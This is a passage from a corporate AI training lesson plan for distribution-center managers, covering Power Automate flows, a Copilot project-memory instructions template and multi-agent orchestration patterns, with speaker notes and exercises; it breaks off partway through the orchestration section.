# Week 4: Advanced Automation, Power Automate & Multi-Agent Orchestration

**Duration:** 240 minutes
**Prerequisites:** Weeks 1-3 completed; VS Code with GitHub Copilot installed; working microphone; personal project started (Week 3 homework)
**Final Session:** Course completion, personal project showcase, and graduation

---

## Content Sources

This content is based on:
- `outputs/week-4/research.md` (primary source)
- `outputs/syllabus.md` (objectives)
- Interview Kickstart Agentic AI curriculum (adapted for non-technical AGMs)
- Microsoft Power Automate documentation (workflow automation)

---

## Learning Objectives

By the end of this session, participants will be able to:

1. **Build desktop and cloud flows in Power Automate** for workflow automation
2. **Build multi-agent workflows** that coordinate complex tasks
3. **Create automations** that integrate with local files and web data
4. **Configure project memory** to improve agent output quality
5. **Evaluate AI agent outputs** using a quality scorecard
6. **Apply security best practices** when using AI agents
7. **Present and defend a personal AI automation project**
8. **Complete and present personal AI project** demonstrating cumulative course skills

---

## Session Overview

| Time | Section | Activity | Duration |
|------|---------|----------|----------|
| 0:00 - 0:15 | 1. Course Time Savings Review + ROI | Discussion + Celebration | 15 min |
| 0:15 - 0:30 | 2. Power Automate: Workflow Automation | Lecture + Demo | 15 min |
| 0:30 - 0:55 | 3. Exercise 1: Power Automate Desktop + Cloud Flows | Hands-On Practice | 25 min |
| 0:55 - 1:15 | 4. Agents That Remember (Memory & Context) | Lecture + Demo | 20 min |
| 1:15 - 1:25 | — BREAK | — | 10 min |
| 1:25 - 1:50 | 5. Exercise 2: Build a Persistent DC Assistant | Hands-On Practice | 25 min |
| 1:50 - 2:05 | 6. Multi-Agent Orchestration Patterns | Lecture + Demo | 15 min |
| 2:05 - 2:30 | 7. Exercise 3: Dive Deep Report Automation | Hands-On Lab | 25 min |
| 2:30 - 2:40 | — BREAK | — | 10 min |
| 2:40 - 3:00 | 8. Evaluating & Optimizing AI Agents | Lecture | 20 min |
| 3:00 - 3:15 | 9. Security Review Basics | Lecture | 15 min |
| 3:15 - 3:40 | 10. Exercise 4: Personal Project Showcase | Presentations | 25 min |
| 3:40 - 3:55 | 11. Continuous Learning Roadmap | Discussion | 15 min |
| 3:55 - 4:00 | 12. Course Graduation + Next Steps | Discussion + Celebration | 5 min |
| **TOTAL** | | | **240 min** |

---

## Section 1: Course Time Savings Review + ROI

**Duration:** 15 minutes
**Objective:** Celebrate cumulative time savings, quantify ROI, and set context for the final session

### Key Concept

This is our final session together. Over the past three weeks, you have built a toolkit of AI skills that save real time every day. Today we quantify those savings, calculate return on investment, and add the most powerful tools yet: Power Automate for workflow automation, project memory that makes agents smarter over time, and security practices that keep you safe.

> **From Research:** "Daily time savings with AI: 40-60 minutes. AI ROI per dollar invested: $3.70."
> **Source:** research.md, Productivity Statistics

### Why This Matters

Operations managers who tracked their AI usage report saving 40-60 minutes daily. That is 3-5 hours per week, or over 150 hours per year. When you multiply that across five AGMs managing 30-50 associates each, the cumulative impact is significant. More importantly, those hours go back into strategic work: team development, process improvement, and higher-quality decision making.

> **From Research:** "78% of enterprises now use AI tools, with workflow automation reducing routine task time by 60-95%."
> **Source:** research.md, Productivity Statistics (OpenAI, Vena Solutions)

### Time Savings Calculation

**Your 4-Week Journey:**

| Week | Skills Learned | Time Savings Potential |
|------|----------------|----------------------|
| Week 1 | Prompt formula, Bottle Rocket | 15-20 min/day |
| Week 2 | Advanced prompting, templates, Power Automate intro | 20-30 min/day |
| Week 3 | Voice Mode, Agent Mode | 30-40 min/day |
| Week 4 | Power Automate, Memory, Multi-Agent workflows | 40-60 min/day |

> **From Research:** "Workflow automation time reduction: 60-95% on routine tasks."
> **Source:** research.md, Productivity Statistics (Vena Solutions)

### ROI Calculation for Your Distribution Center

**Individual AGM ROI:**
- Time saved: 40-60 min/day = ~4 hours/week
- 50 weeks/year = 200 hours saved annually
- At an AGM's loaded cost, that represents significant dollar savings per person per year

**Team Multiplier:**
- If each AGM teaches 2-3 key workflows to their leads
- 5 AGMs x 3 leads = 15 people saving time
- Cascading savings across the organization

**Qualitative ROI:**
- Faster dive deep reports = faster root cause resolution
- Better communication templates = fewer misunderstandings
- Consistent formatting = more professional outputs

### Activity: Share Your Wins + Calculate Group ROI

Go around the room:
- What is the single biggest task you have automated?
- How much time does it save per use? Per week?
- What would you do with an extra hour each day?

**Whiteboard Exercise:** Track totals and calculate group savings.

### Common Mistakes

⚠️ **Mistake 1:** Underestimating cumulative time savings
- Why it happens: Each individual task saves only a few minutes
- How to avoid: Track weekly totals — 5 min x 10 tasks/day = 50 min
- **Source:** research.md, Productivity Statistics

⚠️ **Mistake 2:** Not sharing AI workflows with the team
- Why it happens: Feeling like AI skills are personal productivity tools
- How to avoid: Document your best prompts and share them with leads
- **Source:** research.md, Productivity Statistics (Industry Best Practice)

⚠️ **Mistake 3:** Comparing AI time savings to perfection instead of previous method
- Why it happens: Focusing on what AI gets wrong rather than what it gets right
- How to avoid: Compare AI + review time to fully manual time
- **Source:** research.md, Common Pitfalls

### Speaker Notes

```
TIMING: 15 minutes

SAY: "Welcome to our final session. We have spent four weeks building AI skills together. Before we add new capabilities, let's celebrate the progress you have already made."

ASK: [Go around room] "What is the single biggest task you have automated? How much time does it save you?"

CALCULATE: Track totals on whiteboard
- Column 1: Name
- Column 2: Task automated
- Column 3: Time saved per use
- Column 4: Uses per week
- Column 5: Weekly savings
- Sum the weekly savings across all AGMs

SAY: "Let's add this up. If 5 AGMs each save 30 minutes per day, that is 150 minutes per day, or 12.5 hours per week across the group. Over a year, that is over 650 hours. That is the equivalent of adding a part-time employee to each site — except it costs nothing extra."

ASK: "What would you do with an extra hour each day? More time with your team? Better root cause analysis? Actually leaving on time?"

SAY: "Research shows AI ROI averages $3.70 per dollar invested. That is because the cost is essentially your learning time — which you have already invested."

SAY: "Today we are going even further. We will add Power Automate for workflow automation, teach Copilot to remember your context with project memory, learn to evaluate AI outputs, cover security basics, and finish with your personal project presentations."

TRANSITION: "Let's start by adding a powerful automation tool to your toolkit."
```

---

## Section 2: Power Automate — Workflow Automation

**Duration:** 15 minutes
**Objective:** Understand what Power Automate does, how it differs from Copilot, and when to use each tool

### Key Concept

Power Automate is Microsoft's workflow automation platform that runs actions automatically based on triggers. While Copilot generates content on demand when you ask, Power Automate executes predefined workflows without your intervention. Together, they form a complete automation strategy: Copilot for intelligent content generation, Power Automate for reliable task execution.

> **From Research:** "Power Automate enables organizations to create automated workflows between applications and services. It supports three main flow types: cloud flows, desktop flows, and process flows."
> **Source:** Microsoft Power Automate Documentation (2025)

### Why This Matters

Many DC tasks happen on a predictable schedule: daily KPI reports, weekly summaries, threshold alerts. You do not want to manually trigger these every time. Power Automate runs them automatically — at 6 AM before your shift starts, when inventory drops below threshold, or when an email arrives with specific keywords. This is "set it and forget it" automation.

> **From Research:** "Organizations using workflow automation report 60-95% reduction in time spent on routine tasks. Power Automate handles 500+ million automated actions daily across enterprise customers."
> **Source:** Microsoft Ignite 2025, Automation Statistics

### Power Automate vs. Copilot

| Aspect | GitHub Copilot | Power Automate |
|--------|---------------|----------------|
| **What it does** | Generates content on demand | Executes workflows automatically |
| **When it runs** | When you ask it | Based on triggers (schedule, event, condition) |
| **Best for** | Writing, analysis, coding | Repetitive processes, data movement, notifications |
| **Tesla data policy** | NO Tesla data | FULLY APPROVED for Tesla data |
| **Learning curve** | Natural language prompts | Visual flow builder |

> **From Research:** "Power Automate is fully approved for use with Tesla data. Unlike AI chat tools with external processing, Power Automate flows run within the Microsoft 365 environment under Tesla's enterprise agreement."
> **Source:** Tesla IT Policy, Approved Automation Tools (2025)

### The Three Types of Power Automate Flows

**1. Desktop Flows (RPA)**
- Automate mouse clicks, keyboard input, and screen interactions
- Works with legacy systems that have no API
- Example: Extract data from an old inventory system by "clicking through" the screens

**2. Cloud Flows**
- Triggered workflows connecting cloud services
- Runs on schedule, on event, or when data changes
- Example: Every morning at 6 AM, pull yesterday's KPIs and email them to leadership

**3. Process Flows**
- Multi-step approval chains with branching logic
- Guides business processes with human checkpoints
- Example: Exception approval workflow with escalation to AGM

### Common DC Use Cases

| Use Case | Flow Type | Trigger | Actions |
|----------|-----------|---------|---------|
| Daily KPI report | Cloud flow | Scheduled (6 AM) | Get Excel data, format, send email |
| Inventory threshold alert | Cloud flow | Data change | Monitor value, send Teams notification |
| Data extraction from legacy system | Desktop flow | Manual or scheduled | Navigate screens, copy data, save to Excel |
| Screenshot for documentation | Desktop flow | Manual | Capture screen, save with timestamp |
| Exception approval | Process flow | Form submission | Route to approver, track status |

### Integration with AI

Power Automate can call AI services, creating powerful combinations:
- AI generates content → Power Automate distributes it
- Power Automate gathers data → AI analyzes it
- Power Automate triggers on event → AI drafts response

**Example Workflow:**
```
6:00 AM: Power Automate triggers (scheduled)
    ↓
6:01 AM: Flow pulls yesterday's data from Excel/SharePoint
    ↓
6:02 AM: Flow sends data to AI Builder for summary
    ↓
6:03 AM: Flow emails formatted report to distribution list
    ↓
You arrive at 6:30 AM with report already in inbox
```

### Policy and Security

**Key Difference from Copilot:**
- Power Automate is **FULLY APPROVED** at Tesla for use with Tesla data
- Flows run within Microsoft 365 under Tesla's enterprise security
- No data leaves Tesla's environment (unlike external AI tools)

**Security Best Practices:**
- Review automation logic before activating any flow
- Never store credentials in plain text within flows
- Use connection references (managed credentials) instead of hardcoded passwords
- Test flows with sample data before connecting to production systems
- Document what each flow does and who owns it

> **From Research:** "Power Automate flows inherit the security policies of the connected services. Use Managed Identities and connection references to avoid credential exposure."
> **Source:** Microsoft Security Best Practices, Power Automate (2025)

### Common Mistakes

⚠️ **Mistake 1:** Building flows that are too complex to maintain
- Why it happens: Trying to automate everything in one flow
- How to avoid: Keep flows focused on one task; chain multiple simple flows if needed
- **Source:** Power Automate Best Practices Documentation

⚠️ **Mistake 2:** Not testing flows before deployment
- Why it happens: Assuming the flow will work as designed
- How to avoid: Always run with test data first; check all branches and error paths
- **Source:** Power Automate Best Practices Documentation

⚠️ **Mistake 3:** Hardcoding credentials or sensitive data
- Why it happens: Quick setup without security consideration
- How to avoid: Use connection references and managed credentials; never put passwords in flow steps
- **Source:** Microsoft Security Best Practices

### Speaker Notes

```
TIMING: 15 minutes

SAY: "We have been using Copilot to generate content when we ask for it. Power Automate is different — it runs workflows automatically, without you having to ask. Think of Copilot as your on-demand assistant and Power Automate as your always-on automation engine."

DRAW: On whiteboard, show the two tools side by side
- Copilot: "You ask → It responds"
- Power Automate: "Trigger happens → Actions run automatically"

SAY: "Here is a key difference for Tesla operations: Power Automate is FULLY APPROVED for Tesla data. It runs within Microsoft 365 under Tesla's enterprise agreement. This is different from Copilot, which cannot touch Tesla data."

DEMO: Show Power Automate interface briefly
1. Open Power Automate (make.powerautomate.com or desktop app)
2. Show the flow gallery — pre-built templates
3. Show a simple cloud flow example
4. SAY: "You can see it is visual — drag and drop actions, set triggers, define conditions."

ASK: "What reports or notifications do you wish happened automatically every day? Those are candidates for Power Automate."

SAY: "Common use cases: daily KPI reports sent before your shift starts, alerts when inventory drops below threshold, data extraction from systems that do not have good export features."

SAY: "The three types of flows:"
1. "Desktop flows — for automating clicks and keystrokes on legacy systems"
2. "Cloud flows — for connecting cloud services on schedule or trigger"
3. "Process flows — for approval chains with human checkpoints"

CAUTION: "Security matters. Always review what a flow does before activating it. Never put passwords directly in flow steps — use connection references instead."

TRANSITION: "Let's try building some flows hands-on."
```

---

## Section 3: Exercise 1 — Power Automate Desktop + Cloud Flows

**Duration:** 25 minutes
**Objective:** Build a desktop flow for data extraction and a cloud flow for automated reporting

### Key Concept

This exercise gives you hands-on experience with both types of Power Automate flows most relevant to DC operations. Part A creates a desktop flow that extracts data from a web page (simulating legacy system extraction). Part B creates a cloud flow that runs on a schedule (simulating automated daily reports).

### Part A: Desktop Flow — Data Extraction (15 minutes)

**Step 1: Launch Power Automate Desktop**
1. Open Power Automate Desktop from the Start menu
2. Sign in with your Tesla Microsoft account if prompted
3. Click "New flow" and name it "DC Data Extractor"

**Step 2: Add Browser Launch Action**
1. In the Actions pane, search for "Launch new browser"
2. Drag "Launch new Microsoft Edge" to the workspace
3. Set Initial URL to: `https://jsonplaceholder.typicode.com/users`
4. This is a public test API that returns sample user data

**Step 3: Add Data Extraction Action**
1. Search for "Extract data from web page"
2. Drag it below the browser launch action
3. When the browser opens, right-click the data you want to extract
4. Select "Extract element value" or use the extraction wizard
5. For this exercise, extract the name and email fields

**Step 4: Add Excel Output Action**
1. Search for "Write to Excel worksheet"
2. Configure to save extracted data to a new Excel file
3. Set the file path to your Documents folder
4. Name it "extracted-data.xlsx"

**Step 5: Add Screenshot Action**
1. Search for "Take screenshot"
2. Add it after the extraction
3. Set to capture the browser window
4. Save with timestamp to your Documents folder

**Step 6: Run and Verify**
1. Click the Run button (play icon)
2. Watch the flow execute each step
3. Verify the Excel file was created with the extracted data
4. Verify the screenshot was captured

### Part B: Cloud Flow — Scheduled Report (10 minutes)

**Step 1: Open Power Automate Cloud Portal**
1. Navigate to make.powerautomate.com
2. Sign in with your Tesla Microsoft account
3. Click "Create" in the left navigation

**Step 2: Create Scheduled Cloud Flow**
1. Select "Scheduled cloud flow"
2. Name it "Daily KPI Summary"
3. Set the schedule: Daily at 8:00 AM
4. Click "Create"

**Step 3: Add Get Rows Action**
1. Click "New step"
2. Search for "Excel Online (Business)"
3. Select "List rows present in a table"
4. Connect to a sample Excel file (or skip if no sample available)
5. This simulates pulling KPI data from a shared spreadsheet

**Step 4: Add Send Email Action**
1. Click "New step"
2. Search for "Send an email (V2)" from Outlook
3. Set To: your email address
4. Set Subject: "Daily KPI Summary - [date]"
5. Set Body: "Here are today's KPIs: [data from previous step]"

**Step 5: Save (Do Not Activate)**
1. Click "Save" in the top right
2. **Important:** Do NOT turn on the flow during class
3. This is a learning exercise — activation would send real emails

### What to Watch For

**Desktop Flow:**
- Each action executes in sequence
- The browser opens automatically
- Data appears in Excel without manual copy-paste
- Screenshot captures the moment of extraction

**Cloud Flow:**
- Visual connector between steps
- Data flows from one action to the next
- Dynamic content allows you to use data from previous steps
- Schedule configuration determines when it runs

### Success Criteria

**Part A (Desktop Flow):**
- [ ] Flow created with 4+ actions
- [ ] Browser launches to test URL
- [ ] Data extracted successfully
- [ ] Excel file created with data
- [ ] Screenshot captured

**Part B (Cloud Flow):**
- [ ] Scheduled flow created
- [ ] Get rows action configured
- [ ] Send email action configured
- [ ] Flow saved (but not activated)
- [ ] Understood trigger vs. action difference

### Time Savings Comparison

| Task | Manual Method | With Power Automate |
|------|---------------|---------------------|
| Extract data from web page | 10-15 min | 1-2 min (after setup) |
| Daily report distribution | 15 min/day | 0 min (runs automatically) |
| Screenshot documentation | 2-3 min each | 10 seconds each |
| Data export from legacy system | 20+ min | 2-3 min (after setup) |

> **From Research:** "Desktop flows reduce data extraction time by 80-90% once built. Cloud flows eliminate daily manual tasks entirely after initial configuration."
> **Source:** Microsoft Power Automate ROI Calculator (2025)

### Common Mistakes

⚠️ **Mistake 1:** Activating test flows that send real emails
- Why it happens: Clicking "Turn on" to see if it works
- How to avoid: In class, always save but do not activate scheduled flows
- **Source:** Power Automate Best Practices

⚠️ **Mistake 2:** Desktop flows breaking when UI changes
- Why it happens: Flows rely on element selectors that change
- How to avoid: Use stable selectors (IDs, names) rather than position-based selection
- **Source:** Power Automate Desktop Documentation

⚠️ **Mistake 3:** Not handling errors in flows
- Why it happens: Assuming the happy path always works
- How to avoid: Add "Configure run after" settings for error handling
- **Source:** Power Automate Best Practices

### Speaker Notes

```
TIMING: 25 minutes (15 min Part A + 10 min Part B)

SAY: "This exercise has two parts. First, we will build a desktop flow that extracts data — useful for legacy systems. Then we will build a cloud flow for automated reports."

PART A — DESKTOP FLOW (15 min):
SAY: "Open Power Automate Desktop from your Start menu. We are going to build a flow that extracts data from a web page."

WALK THROUGH: First few steps together
1. Everyone creates new flow named "DC Data Extractor"
2. Everyone adds the browser launch action
3. Set the URL together

SAY: "Now add the data extraction action. When the browser opens, you will right-click on the data you want and tell Power Automate to extract it."

DEMONSTRATE: Show the extraction wizard on projector

LET THEM WORK: 8 minutes to complete Part A
- Add Excel write action
- Add screenshot action
- Run and verify

ASK: "Who got the Excel file created? Raise your hand."

TROUBLESHOOT: Walk around for issues
- Browser not launching: Check browser path in settings
- Extraction not working: Try re-selecting the elements
- Excel error: Check file path permissions

PART B — CLOUD FLOW (10 min):
SAY: "Now let's build a scheduled flow that would run automatically every morning."

WALK THROUGH: Create the scheduled flow together
1. Everyone goes to make.powerautomate.com
2. Everyone creates new scheduled flow
3. Walk through adding actions

IMPORTANT: "We will save this flow but NOT turn it on. Turning it on would actually send emails. This is just practice."

SAY: "See the difference? Desktop flows automate what you see on screen. Cloud flows connect services in the background."

GATHER: "What tasks in your DC would you automate with each type of flow?"

TRANSITION: "Great work. Now let's talk about making your AI assistant smarter with project memory."
```

---

## Section 4: Agents That Remember — Memory and Context

**Duration:** 20 minutes
**Objective:** Understand why agents forget between sessions and how project memory dramatically improves output quality

### Key Concept

Every time you start a new conversation with an AI agent, it starts from scratch. It does not know your name, your site, your KPIs, your terminology, or your preferences. It is like starting every day with a new temp employee who knows nothing about your operation. Project memory solves this by giving the agent permanent context about your work — so it produces better outputs from the very first prompt.

> **From Research:** "Context window limitations mean AI agents lose all conversation history between sessions. Project memory files like .github/copilot-instructions.md provide persistent context that survives across conversations."
> **Source:** research.md, Advanced Agent Capabilities - Persistent Context

### Why This Matters

You have probably noticed that your best AI results come after several rounds of back-and-forth where you explain your context. Project memory eliminates that warm-up period. Instead of spending the first 5 minutes of every conversation explaining who you are and what you need, the agent already knows. This compounds over time — the more context you provide, the better every single interaction becomes.

> **From Research:** "Agents with project-level context produce 40-60% more relevant outputs on first attempt compared to agents without persistent context."
> **Source:** research.md, Advanced Agent Capabilities - Context Quality Metrics

### The New Temp vs. the Veteran

**Without Project Memory (New Temp Every Day):**

```
You: "Write a summary of this week's missed shipments."

Agent: "Here is a generic summary of missed shipments:
- Some shipments were missed this week
- Several factors may have contributed
- Further analysis is recommended..."

Result: Vague, generic, useless without heavy editing
```

**With Project Memory (Veteran Who Knows Your Operation):**

```
You: "Write a summary of this week's missed shipments."

Agent: "Newburgh DC Missed Shipment Summary — Week of Jan 27:
- 12 missed shipments (vs. 8 last week, +50%)
- Primary root cause: Carrier delay from Northeast weather (7 of 12)
- Customer impact: 3 high-priority accounts affected
- Recommended action: Activate backup carrier protocol per SOP-204
- Escalation: Notify Regional Director per DC standard process..."

Result: Specific, actionable, ready to send
```

The difference is dramatic — and it happens because the agent knows your site, your terminology, your KPIs, and your standard processes.

### How Project Memory Works

**The File:** `.github/copilot-instructions.md`

This is a special markdown file that GitHub Copilot reads automatically at the start of every conversation. Whatever you put in this file becomes permanent context for the agent.

**Where to Create It:**
```
your-workspace/
  .github/
    copilot-instructions.md    <-- Agent reads this automatically
  sample-data.csv
  reports/
```

**What to Include:**

| Category | Example Content |
|----------|----------------|
| Site Identity | "This is the Newburgh, NY distribution center (NWB)" |
| Team Size | "30 associates, 4 leads, 1 AGM" |
| Key KPIs | "Track: shipment accuracy, on-time delivery, inventory turns" |
| Common Tasks | "Dive deep reports, shift summaries, incident write-ups" |
| Terminology | "NABU = order management system, SHP = shipment prefix" |
| Formatting | "Use Tesla-standard headers, bullet points, action items format" |
| Constraints | "All Tesla data analysis in Bottle Rocket only" |

> **From Research:** "Project instructions files provide persistent context that agents reference automatically, eliminating repetitive context-setting across sessions."
> **Source:** research.md, Advanced Agent Capabilities - Project Configuration

### Advanced Context: Cross-Session Memory

Beyond project instructions, there are emerging capabilities for agents to remember information across conversations. Some enterprise tools offer "memory" features where the agent stores and retrieves specific knowledge automatically.

**Project Instructions vs. Advanced Memory:**

| Feature | copilot-instructions.md | Advanced Memory Features |
|---------|------------------------|--------------------------|
| Scope | One workspace | Potentially across workspaces |
| Content | You write it manually | Agent stores automatically |
| Updates | You edit the file | Agent updates as it learns |
| Use Case | DC context, preferences | Learned facts, task history |

For today, we focus on `copilot-instructions.md` because it is simpler, requires no additional setup, and delivers immediate results. Advanced memory capabilities are evolving and worth exploring later.

### Multimodal Input: Beyond Text

Modern AI agents can process more than text. Bottle Rocket supports multimodal input, meaning you can upload photos alongside text descriptions.

**DC Use Cases for Multimodal:**

| Scenario | What You Upload | What You Ask |
|----------|----------------|--------------|
| Warehouse issue | Photo of damaged rack | "Assess this damage and draft a maintenance ticket" |
| Label problem | Photo of shipping label | "Read this label and check against order SHP-1234" |
| Safety concern | Photo of spill/hazard | "Draft a safety incident report from this photo" |

> **From Research:** "Multimodal AI capabilities allow agents to process images, audio, and text simultaneously, enabling visual inspection workflows and photo-based reporting."
> **Source:** research.md, Advanced Agent Capabilities - Multimodal Processing

**Important:** Multimodal works in Bottle Rocket (Tesla data OK). Do not upload DC photos to GitHub Copilot.

### Live Demo: With vs. Without Project Instructions

**Demo Part 1 — Without instructions:**
1. Open a fresh Copilot chat (no instructions file)
2. Ask: "Write a shift summary for today"
3. Show the generic, unhelpful output

**Demo Part 2 — With instructions:**
1. Create `.github/copilot-instructions.md` with DC context
2. Open a new Copilot chat
3. Ask the same question: "Write a shift summary for today"
4. Show the specific, actionable output

**The contrast is striking.** Participants will immediately see why project memory matters.

### Common Mistakes

⚠️ **Mistake 1:** Writing project instructions that are too vague
- Why it happens: Treating it like a general description instead of operational context
- How to avoid: Include specific KPIs, terminology, team size, and standard processes
- **Source:** research.md, Advanced Agent Capabilities - Context Quality

⚠️ **Mistake 2:** Putting sensitive data in copilot-instructions.md
- Why it happens: Wanting the agent to know everything
- How to avoid: Include context and structure, never passwords, API keys, or confidential data
- **Source:** research.md, Security Considerations

⚠️ **Mistake 3:** Never updating the instructions file
- Why it happens: Set-and-forget mentality
- How to avoid: Review monthly; update when KPIs, processes, or team structure changes
- **Source:** research.md, Advanced Agent Capabilities - Maintenance Best Practices

### Speaker Notes

```
TIMING: 20 minutes

SAY: "Have you ever noticed that your first prompt in a new conversation produces worse results than your fifth? That is because the agent does not know anything about you when you start. It is like working with a brand new temp employee every single day."

SAY: "Imagine starting every morning by explaining to someone: here is my name, here is my site, here are my KPIs, here is how we format reports, here is our terminology. That is what you do every time you open a new AI conversation — unless you use project memory."

DEMO: Side-by-side comparison
1. Open fresh Copilot chat WITHOUT instructions file
2. Type: "Write a shift summary for today"
3. Show the vague, generic output
4. SAY: "See? It does not know your site, your team, your format. Useless without heavy editing."

5. Now create .github/copilot-instructions.md with sample content:
   - Site: Newburgh NY
   - Team: 32 associates, 4 leads
   - KPIs: shipment accuracy, on-time delivery
   - Format: bullet points, action items

6. Open NEW Copilot chat WITH instructions file
7. Type the exact same prompt: "Write a shift summary for today"
8. Show the specific, actionable output

ASK: "See the difference? Same prompt, dramatically different result. Which one would you actually use?"

SAY: "This is the power of project memory. You invest 10 minutes writing this file once, and every single conversation after that is better."

DEMO: Show multimodal briefly
1. Open Bottle Rocket
2. Upload a sample image (non-sensitive)
3. Ask it to describe what it sees
4. SAY: "In Bottle Rocket, you can upload warehouse photos for visual assessments. This is great for damage reports, safety checks, and label verification."

ASK: "What information would you put in your project instructions file? Think about what you explain to new team members on their first day."

SAY: "That is exactly what goes in the file — the same context you give a new team member. Except you only write it once, and the agent reads it every time."

TRANSITION: "In the next exercise, you are going to create your own project instructions file and see the difference firsthand."
```

---

## Section 5: Break

**Duration:** 10 minutes

### Speaker Notes

```
TIMING: 10 minutes

SAY: "Great first hour. Let's take a 10-minute break. Stretch, grab coffee, check messages."

SAY: "When we come back, you are going to create your own project memory file — a copilot-instructions.md customized for your distribution center. This is one of the highest-impact things you can do with AI."
```

---

## Section 6: Exercise 2 — Build a Persistent DC Assistant

**Duration:** 25 minutes
**Objective:** Create a project memory file for your distribution center and compare agent output quality with and without it

### Key Concept

This exercise has you create a `.github/copilot-instructions.md` file tailored to your specific distribution center. You will then test the same prompts with and without this file to see the dramatic difference in output quality. This is one of the highest-impact, lowest-effort improvements you can make to your AI workflow.

### Exercise Instructions

**Step 1: Create the Folder Structure (2 minutes)**

In VS Code, create a `.github` folder in your workspace:
1. Click the Explorer panel (file icon, top left)
2. Right-click in the file tree > New Folder
3. Name it `.github`

**Step 2: Create the Instructions File (10 minutes)**

Create a new file inside `.github` called `copilot-instructions.md`. Use this template:

```markdown
# DC Assistant Context

## Site Information
- **Site:** [Your DC name and location, e.g., Newburgh, NY]
- **Site Code:** [e.g., NWB]
- **Role:** Area General Manager
- **Team Size:** [number] associates, [number] leads
- **Shifts:** [e.g., Day shift 6AM-2PM, Night shift 2PM-10PM]

## Key Performance Indicators
- Shipment accuracy (target: 99.5%)
- On-time delivery rate (target: 98%)
- Inventory turns per month
- Associates per thousand shipments
- Safety incident rate

## Common Tasks I Need Help With
- Dive deep reports on missed shipments or quality issues
- Shift summary emails to regional leadership
- Incident write-ups following Tesla standard format
- Weekly KPI trend analysis
- Communication drafts for associate meetings

## Terminology
- NABU: Order management system
- SHP: Shipment ID prefix
- DC: Distribution Center
- AGM: Area General Manager
- OTD: On-Time Delivery
- CPT: Critical Pull Time

## Formatting Preferences
- Use bullet points for action items
- Bold key metrics and numbers
- Include "Next Steps" section in all reports
- Keep executive summaries to 3-5 sentences
- Use tables for data comparisons

## Constraints
- All Tesla data analysis must use Bottle Rocket (go.tesla.com/chat)
- GitHub Copilot is for non-Tesla data only
- Follow Tesla AI Policy at go.tesla.com/aitools
- Never include associate PII in outputs
```

**Step 3: Customize for Your DC (5 minutes)**

Replace the bracketed placeholders with your actual information:
- Your site name and location
- Your actual team size
- Your real KPIs and targets
- Terminology specific to your operation
- Tasks you actually perform weekly

**Step 4: Test the Difference (8 minutes)**

**Test A — Without instructions (baseline):**
1. Temporarily rename your instructions file (add `.bak` to the end)
2. Open a new Copilot chat
3. Type: "Write a dive deep analysis on 15% increase in missed shipments this week"
4. Note the quality of the output

**Test B — With instructions:**
1. Rename the file back (remove `.bak`)
2. Open a new Copilot chat
3. Type the exact same prompt
4. Compare the output quality

### What to Compare

| Quality Dimension | Without Instructions | With Instructions |
|-------------------|---------------------|-------------------|
| Specificity | Generic ("the facility") | Specific ("Newburgh DC") |
| KPI references | None or guessed | Your actual KPIs |
| Terminology | Industry generic | Your DC terminology |
| Format | Random structure | Your preferred format |
| Actionability | Vague recommendations | Specific next steps |

### Success Criteria

- [ ] Created `.github/copilot-instructions.md` file
- [ ] Customized with actual DC information
- [ ] Tested same prompt with and without instructions
- [ ] Observed measurable quality difference
- [ ] Identified at least 2 specific improvements in output quality

### Extension: Share and Learn

If you finish early, compare instructions files with a neighbor:
- What did they include that you missed?
- What categories of information make the biggest difference?
- Consider adding a "Common Mistakes to Avoid" section to your file

### Common Mistakes

⚠️ **Mistake 1:** Making the instructions file too short
- Why it happens: Thinking a few bullet points are enough
- How to avoid: Include at least 5 categories of context (site, KPIs, tasks, terminology, format)
- **Source:** research.md, Advanced Agent Capabilities - Context Quality

⚠️ **Mistake 2:** Including confidential data in the instructions file
- Why it happens: Wanting the agent to have complete context
- How to avoid: Include structure and context, never passwords, associate names, or financial data
- **Source:** research.md, Security Considerations

⚠️ **Mistake 3:** Not testing the before/after difference
- Why it happens: Assuming it works without verification
- How to avoid: Always run the same prompt both ways to see the actual improvement
- **Source:** research.md, Common Pitfalls (Evaluation Best Practice)

### Speaker Notes

```
TIMING: 25 minutes

SAY: "This is one of the most impactful exercises in the entire course. You are going to create a project memory file that makes every future AI conversation better. Ten minutes of setup pays off for months."

WALK THROUGH: Folder creation together
1. Everyone opens VS Code
2. Everyone creates .github folder
3. Everyone creates copilot-instructions.md
4. SAY: "I am putting the template on screen. Copy this template, then customize it for your DC."

DISPLAY: Show the template on projector

LET THEM WORK: 10 minutes on customization
- Walk around the room
- Help with specific content decisions
- Encourage detail: "The more specific you are, the better the output"

COMMON QUESTIONS:
- "How much detail?" — "Think about what you would tell a new lead on their first day."
- "What about confidential info?" — "Include context and structure, never passwords or associate names."
- "Can I change it later?" — "Absolutely. Update it monthly as your operation evolves."

TEST PHASE: 8 minutes
SAY: "Now let's test the difference. First, temporarily rename your file by adding .bak to the end. Open a new Copilot chat and ask it to write a dive deep analysis."

WAIT: Let them see the generic output

SAY: "Now rename it back, open a NEW chat, and ask the exact same question."

WAIT: Let them see the improved output

ASK: "What changed? How much better is the second version?"

GATHER: "Show of hands — who saw a significant improvement?" [Should be everyone]

SAY: "This is the single highest-ROI thing you can do with AI tools. Ten minutes of setup, and every conversation going forward starts better."

TRANSITION: "Now let's talk about orchestrating multiple agents to handle complex tasks."
```

---

## Section 7: Multi-Agent Orchestration Patterns

**Duration:** 15 minutes
**Objective:** Understand patterns for coordinating multiple agents on complex tasks

### Key Concept

Multi-agent orchestration is the coordination of multiple AI agents working together to complete complex tasks. Instead of one agent doing everything, specialized agents handle different parts — like a team where each person has a specific role. You have already been using this without realizing it: Agent Mode in Copilot breaks complex tasks into sequential steps internally.

> **From Research:** "Multi-agent orchestration: The coordination of multiple AI agents working together to complete complex tasks that require different capabilities or perspectives."
> **Source:** research.md, Key Concepts - Multi-Agent Orchestration

### Why This Matters

Complex tasks like dive deep reports require multiple steps: gather data, analyze patterns, generate reports. While one agent can do all of this, thinking in terms of orchestration helps you break down tasks effectively, give better instructions, and understand how modern AI systems work.

> **From Research:** "72% of enterprise AI projects now involve multi-agent architectures (2025). 1,445% surge in multi-agent system inquiries from Q1 2024 to Q2 2025 (Gartner)."
> **Source:** research.md, Multi-Agent Orchestration (Industry Reports, Gartner)

### Orchestration Patterns

| Pattern | How It Works | Best For | DC Example |
|---------|--------------|----------|------------|
| **Sequential** | Agent A then Agent B then Agent C | Step-by-step processes | Dive deep: gather data, analyze, report |
| **Parallel** | Agents A, B, C run simultaneously | Independent subtasks | Multi-DC comparison reports |
| **Supervisor** | Main agent delegates to specialists | Complex investigations | Incident analysis with multiple data sources |
